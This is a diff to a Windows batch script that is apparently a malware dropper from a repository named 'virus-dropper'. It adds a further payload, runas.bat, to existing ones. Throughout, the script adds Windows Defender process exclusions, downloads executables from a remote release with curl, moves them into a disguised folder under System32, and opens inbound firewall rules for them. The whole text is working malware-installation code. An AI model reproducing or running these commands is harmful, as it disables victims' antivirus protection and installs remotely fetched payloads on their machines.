@@ -22,6 +22,8 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 cls
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"funky.exe'"
 cls
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"runas.bat'"
+cls
 md "%systemroot%\System32\Windowsexe"
 cls
 
@@ -30,6 +32,7 @@ cls
 curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows.exe" --output "%appdata%\Windows.exe"
 curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows2.exe" --output "%appdata%\Windows2.exe"
 curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/funky.exe" --output "%appdata%\funky.exe"
+curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/runas.bat" --output "%appdata%\runas.bat"
 ::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)
 cls
 
@@ -37,6 +40,7 @@ cls
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
 move "%appdata%\Windows2.exe" "%systemroot%\System32\Windowsexe"
 move "%appdata%\funky.exe" "%systemroot%\System32\Windowsexe"
+move "%appdata%\runas.bat" "%systemroot%\System32\Windowsexe"
 cls
 
 
@@ -63,6 +67,7 @@ cls
 netsh advfirewall firewall add rule name="Windows Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\Windows.exe" enable=yes
 netsh advfirewall firewall add rule name="Windows Manager 2" dir=in action=allow program="%systemroot%\System32\Windowsexe\Windows2.exe" enable=yes
 netsh advfirewall firewall add rule name="Client Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\funky.exe" enable=yes
+netsh advfirewall firewall add rule name="Client Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\runas.bat" enable=yes
 cls
 del /f NSudo.exe
 cls
